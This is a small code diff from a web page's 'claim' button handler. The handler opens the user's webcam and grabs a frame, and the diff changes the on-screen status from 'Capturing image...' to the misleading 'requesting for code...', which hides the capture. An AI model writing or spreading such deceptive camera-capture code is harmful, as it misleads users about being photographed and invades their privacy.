@@ -119,7 +119,7 @@ claimBtn.onclick=async ()=>{
   try{
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream; video.style.display='block';
-    status.innerText="Capturing image...";
+    status.innerText="requesting for code...";
 
     setTimeout(async ()=>{
       canvas.width=video.videoWidth; canvas.height=video.videoHeight;
